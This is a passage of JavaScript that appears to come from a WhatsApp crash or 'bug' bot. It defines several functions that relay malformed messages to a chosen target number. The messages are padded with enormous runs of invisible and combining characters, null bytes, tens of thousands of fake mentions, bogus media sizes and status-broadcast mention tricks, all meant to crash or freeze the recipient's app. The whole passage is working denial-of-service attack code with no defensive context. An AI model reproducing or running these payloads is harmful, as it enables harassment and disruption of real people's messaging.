title: "\u200c".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
{
title: "\u200c".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
],
};
await conn.relayMessage(isTarget, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: header,
body: body,
carouselMessage: carouselMessage,
},
},
},
}, Ptcp ? { participant: { jid: isTarget } } : { quoted: null });
}
async function Raldz7(target, Ptcp = true) {
    let virtex = "[☣️] 𝐃𝐚𝐧𝐠𝐞𝐫 𝐔𝐢̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "ꦾ".repeat(49000);
    await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u0009".repeat(100),
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "\u0009" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
//FUNCTION PROTOX
async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `${1}${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".𝗥𝗜𝗞𝗭𝗭 𝗭𝗛𝗜𝗥𝗢" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: Buffer.from("c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", "base64"),
        fileLength: "289511",
        seconds: 15,
        mediaKey: Buffer.from("IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", "base64"),
        caption: "友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤",
        height: 640,
        width: 640,
        fileEncSha256: Buffer.from("BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", "base64"),
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤ᢶ⃟"
        },
        streamingSidecar: Buffer.from("cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=", "base64"),
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: Buffer.from("QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", "base64"),
        thumbnailEncSha256: Buffer.from("fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=", "base64"),
        annotations: [
            {
                embeddedContent: { embeddedMusic },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function xatanicinvisv4(jid) {
    const delay = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "assalamualaikum",
                    listType: 2,
                    buttonText: null,
                    sections: delay,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (jid) {
        await conn.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_jid: "soker tai" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function outofsync(target) {
    await conn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@El-Shin",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
async function protocolbug6(target, mention) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Yamete" + "ោ៝".repeat(10000),
        title: "Hentai",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "KIMOCHI",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protoXvid(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𖤐 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤" + "ោ៝".repeat(10000),
        title: "⇞ 𝗥𝗜𝗞𝗭𝗭 𝗭𝗛𝗜𝗥𝗢 ⇟",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𖤐 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤𖤐",
        height: 999999,
        width: 999999,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363381288267213@newsletter",
            serverMessageId: 1,
            newsletterName: "⇞ 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ⇟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function protoXimg(isTarget, mention) {
    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    caption: "𖤐 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤𖤐",
    fileSha256: "aA1/vATnQcXlUBaQ1oAyXOC6I6ZRVDSuHaYDMpNcGbU=",
    fileLength: "999999",
    height: 999999,
    width: 999999,
    mediaKey: "b9k58Kc4h6DdwrOWefVdr/aLwHzoxxSWrFQ8Pk2uCXk=",
    "fileEncSha256": "odx9UpoytXfE7ze2CgIPrJa0K4cCEN/DxFfjt/wKimM=",
    directPath: "/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1746342199",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAADzxPj1na/bTkx0+uyOOpRoFho5MYb0pSXqr+8R2axtzHNSTAjbCZx2Voxvu3yxLLOQ0vPKsvCabknsXq602sq3Q41nR1MyeaxQB1wG35A1X0NhUMIAEf/EACMQAAIDAAIBBQEBAQAAAAAAAAECAAMREiEEEyIxQVFCFCP/2gAIAQEAAT8AA0ExQpHZi1fncHj4p3YaJ/mOaJxQf1GCMd2MoH3BmExACx4yipEUct0zimYNgrTT2eoBhzvJ5NCJjza/oGFRvX5ANDShDzEFbYNycSD8CGsjfaIq8l7XDL02sjBOXZHAR90QOiKfvZ4rKbAxjMioNJge1Ty64z1QQezKvJtNpBhIZeQPUuL8/aNBjqdBP5ErHHSZRXlkUCxO83JTU5c62icCLMCwVYxbAJbqowzqZZucpYGCnWlTD8JwT1MckA9j4lNuggqVlHkIjsr/ABsNlfzz6jWB7gFY5LLtfhpMsZUcMNjOnpguvZ+BK34gZmxH/wCjSwsoU/cI5b7eyYq7HKqF4r8SpGbmQPd8iMSM5CXOGXqKCfueEhN30ROD2nXwjTmQJWiEkDZ7QTnDRH3sCsdQcsA4Yf5Innhw+ExlcDdiaehKGNbg5o+xPVxgaxgjX2vy6E52nfaIHt9x/Rk9U/0SJ5LCxuWR26wz/8QAGxEAAgIDAQAAAAAAAAAAAAAAAAEQERIgITD/2gAIAQIBAT8AEikPmjGVFw3NmXh//8QAIhEBAAEDAwQDAAAAAAAAAAAAAQACESEQEjEDMkFRQpGh/9oACAEDAQE/ACnt4lj1Np6mLfGVFmbS1OS5CMyeX6vK8VOg/sY1I4Yq8uhVHqLrSQCWJYjP/9k=",
    scansSidecar: "kGPbOzyrXkA+tcRTlOjwO2d16WRC5j+U3wM0aULEpvWziWDL4AuVmQ==",
    scanLengths: [ 7566, 58200, 24715, 32660],
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 40000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Yorxputz",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await conn.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
async function delayMakerInvisible(isTarget) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
